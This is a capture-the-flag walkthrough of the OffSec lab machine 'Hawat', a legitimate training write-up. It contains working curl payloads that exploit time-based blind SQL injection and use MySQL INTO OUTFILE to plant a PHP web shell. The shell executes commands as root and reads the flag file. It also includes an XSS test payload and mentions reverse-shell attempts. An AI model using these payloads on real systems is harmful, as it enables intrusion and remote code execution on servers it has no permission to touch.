---
layout: post
title: "Hawat - OffSec Proving Grounds Practice"
date: 2026-06-12 10:00:00 +0800
categories: [Walkthroughs, Web Security]
tags: [OffSec, Web, SQLi, Enumeration]
platform: OffSec Proving Grounds
difficulty: Hard
author: dreaith
---

Hawat is rated **Easy** by OffSec but **Very Hard** by the community  and after working through it, that gap makes sense. The box runs three separate web applications, and the vulnerable endpoint returns the exact same output no matter what input it receives, so the usual signs of SQL injection (errors, changed results, broken pages) are completely invisible. The only way to detect it is by timing the response.

[portal.offsec.com/machine/hawat-15710/overview/details](https://portal.offsec.com/machine/hawat-15710/overview/details)

![Hawat lab card at 100% progress](/assets/img/posts/hawat/01-lab-card.png)
{: .shadow width="900" }

## I. Enumeration

```bash
nmap -sC -sV -p- --min-rate 5000 <ip address>
```

```
22/tcp    open  ssh    OpenSSH 8.4
17445/tcp open  http   Apache Tomcat — "Issue Tracker"
30455/tcp open  http   nginx 1.18.0 — "W3.CSS"
50080/tcp open  http   Apache/2.4.46 PHP/7.4.15 — "W3.CSS Template"
```

### Port 17445 — Issue Tracker

![The Issue Tracker landing page on port 17445](/assets/img/posts/hawat/02-issuetracker-landing.png)
{: .shadow width="900" }

A Spring Boot-based issue tracker with Register/Sign In. Tried common creds (`admin:admin`, `admin:password`) — no luck. A blind `sqlmap` run against a guessed `?id=` parameter came back not injectable.

![Failed login attempt with admin:admin](/assets/img/posts/hawat/03-login-failed.png)
{: .shadow width="900" }

![sqlmap against the guessed ?id= parameter — not injectable](/assets/img/posts/hawat/04-sqlmap-id-notinjectable.png)
{: .shadow width="900" }

After registering and logging in, two new sections appear: `/issue/list` and `/user/list`, both with Edit/Delete.

![Signed-in issue list view](/assets/img/posts/hawat/05-issuelist-after-login.png)
{: .shadow width="900" }

![Annotated notes on the discovered /issue/list and /user/list URLs](/assets/img/posts/hawat/06-urls-discovered.png)
{: .shadow width="900" }

Editing a user hits `/user/edit/<id>` — an IDOR-style ID change reveals other usernames, but the likely admin account (ID `1`) wasn't present, so this was a dead end for privilege escalation via IDOR.

![Editing another user via /user/edit/<id> reveals the username "clinton"](/assets/img/posts/hawat/07-user-edit-idor.png)
{: .shadow width="900" }

### Port 30455 — nginx / W3.CSS template

![The port 30455 W3.CSS "pizza sale" template site](/assets/img/posts/hawat/08-port30455-landing.png)
{: .shadow width="900" }

Source code contained a developer comment: `<!-- Test adds with URL/?title=test -->`.

![View-source showing the developer comment hinting at the ?title=test parameter](/assets/img/posts/hawat/09-devcomment-title-param.png)
{: .shadow width="900" }

Following that hint, `?title=test` reflected directly into the page:

![?title=test reflecting into every card on the page](/assets/img/posts/hawat/10-title-param-reflected.png)
{: .shadow width="900" }

confirmed with `<script>alert(1)</script>`, which fired.

![The XSS payload firing successfully in the browser, confirming the title parameter is vulnerable](/assets/img/posts/hawat/11-xss-alert-fired.png)
{: .shadow width="900" }

**Reflected XSS confirmed.** A quick `'` for SQLi didn't break anything here — this parameter is just string substitution, not a database query.

![?title=' OR SLEEP(5)=' reflecting back as literal text instead of executing](/assets/img/posts/hawat/12-sqli-quote-literal.png)
{: .shadow width="900" }

`sqlmap` against the same parameter agreed — flagged as a likely XSS vector, but not injectable for SQL:

![sqlmap against ?title=test — confirms the XSS heuristic, not injectable for SQLi](/assets/img/posts/hawat/13-sqlmap-title-xss-heuristic.png)
{: .shadow width="900" }

A separate `gobuster` run against this port found `phpinfo.php`, which leaked `DOCUMENT_ROOT=/srv/http` — an important detail for later.

![The phpinfo.php page leaking DOCUMENT_ROOT=/srv/http](/assets/img/posts/hawat/16-phpinfo-leak.png)
{: .shadow width="900" }

### Port 50080 — PHP pizza template

```bash
gobuster dir -u http://<ip>:50080 -w /usr/share/wordlists/dirb/common.txt
```

![gobuster against port 50080, finding /images/ and /4/](/assets/img/posts/hawat/14-gobuster-50080.png)
{: .shadow width="900" }

Found `/images/` and `/4/` (dead ends — just a stray `w3.css` asset).

![Index of /4/ — just a lone w3.css file](/assets/img/posts/hawat/15-index-of-4.png)
{: .shadow width="900" }

## Finding the Vulnerable Endpoint

Back on port 17445, created a "New Issue" and pasted an XSS payload to try to grab an admin cookie — nothing fired.

![A "New Issue" with an XSS payload targeting document.cookie — this one didn't fire](/assets/img/posts/hawat/17-newissue-xss-payload.png)
{: .shadow width="900" }

Captured the "New Issue" POST request in Burp instead and ran `sqlmap` against the saved request file, which tests **both** the `message` and `priority` POST parameters automatically:

![Burp Proxy intercepting the POST /issue/save request](/assets/img/posts/hawat/18-burp-intercept-issuesave.png)
{: .shadow width="900" }

```bash
sqlmap -r issue_edit.req --batch --dbs --level=3 --risk=2
```

Both parameters came back "not injectable," **but** the run logged **111 internal server errors (500)**. That's a strong signal something is fragile even if sqlmap doesn't recognize it.

![sqlmap logging 111 internal server errors (500) during the run](/assets/img/posts/hawat/19-sqlmap-500errors.png)
{: .shadow width="900" }

Probing known Spring controller patterns surfaced an undocumented endpoint:

```
POST /issue/checkByPriority
```

- `GET` → 405 Method Not Allowed (confirms the endpoint exists, POST only)
- `POST priority=High` → 200 OK with the issue list HTML

### Confirming time-based blind SQLi

```bash
time curl -s -b "JSESSIONID=<session>" -X POST \
  -d "priority=High' AND SLEEP(5)-- -" \
  "http://<IP>:17445/issue/checkByPriority"
```

The response took ~5 seconds while the page content stayed identical — classic **time-based blind SQL injection**. The `priority` value is concatenated directly into a backend MySQL query, and while the query result isn't reflected on the page, it *does* execute.

## Writing a Web Shell

Since `SLEEP()` executes and the DB is MySQL, tested for `FILE` privilege:

**Step 1 — Confirm FILE privilege and write access to `/srv/http`:**

```bash
curl -s -b "JSESSIONID=<session>" -X POST \
  --data-urlencode "priority=High' UNION SELECT 'test' INTO OUTFILE '/srv/http/test.txt'-- -" \
  "http://<IP>:17445/issue/checkByPriority"

curl http://<IP>:30455/test.txt
# -> test
```

![Sending the UNION SELECT ... INTO OUTFILE request via curl](/assets/img/posts/hawat/20-curl-outfile-write.png)
{: .shadow width="900" }

![Confirming test.txt was written and is served on port 30455](/assets/img/posts/hawat/21-curl-testtxt-confirm.png)
{: .shadow width="900" }

The MySQL service account has `FILE` privileges **and** write access into the nginx web root shared at `/srv/http` — recalling the `phpinfo.php` leak from earlier.

**Step 2 — Drop a PHP web shell:**

```bash
curl -s -b "JSESSIONID=<session>" -X POST \
  --data-urlencode "priority=High' UNION SELECT '<?php echo system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/srv/http/cmd.php'-- -" \
  "http://<IP>:17445/issue/checkByPriority"
```

**Step 3 — Trigger it:**

```bash
curl "http://<IP>:30455/cmd.php?cmd=id"
# uid=0(root) gid=0(root) groups=0(root)
```

![Triggering the dropped web shell and confirming it runs as uid=0 (root)](/assets/img/posts/hawat/22-curl-cmdphp-root.png)
{: .shadow width="900" }

The web shell executes as **root** — the MySQL service and the file it wrote both run with root privileges.

## Capturing the Flag

Reverse shell attempts (`bash -i >& /dev/tcp/...`, mkfifo-based shells, base64 piping) all failed silently — the target has no outbound network access. Not a blocker, since root-level command execution is already available through the web shell:

```bash
curl -s -G --data-urlencode "cmd=cat /root/proof.txt" "http://<IP>:30455/cmd.php"
```

![Reading /root/proof.txt directly through the web shell](/assets/img/posts/hawat/23-curl-flag-readproof.png)
{: .shadow width="900" }

![Hawat marked as pwned](/assets/img/posts/hawat/24-hawat-pwned.png)
{: .shadow width="900" }

## Summary

1. Enumerate the three HTTP services.
2. Register/log in to unlock `/issue/list` and `/user/list` on port 17445.
3. Confirm reflected XSS on port 30455 and use a `phpinfo.php` leak to learn `DOCUMENT_ROOT=/srv/http`.
4. Discover the undocumented `POST /issue/checkByPriority` endpoint.
5. Confirm time-based blind SQLi via `SLEEP(5)` in the `priority` parameter.
6. Abuse `UNION SELECT .. INTO OUTFILE` to write a PHP web shell into the shared web root (`/srv/http/cmd.php`), served by port 30455.
7. Confirm the web shell runs as root.
8. Read `/root/proof.txt` directly through the web shell.

## Lessons

Don't fully trust sqlmap when it says a parameter isn't injectable  a wall of server errors while testing is itself a signal that your input is reaching something fragile, even if sqlmap can't confirm a vulnerability. SQL injection can exist even when the page output never changes, so timing-based tests like `SLEEP()` are worth running regardless. If different services on a box share the same file storage, a database with file-write permissions can be used to drop a web shell that another service will happily serve  turning a "blind" SQL injection into full remote code execution. And once you can run commands as root, you don't need a reverse shell  you can just read the flag directly through the same access you already have.

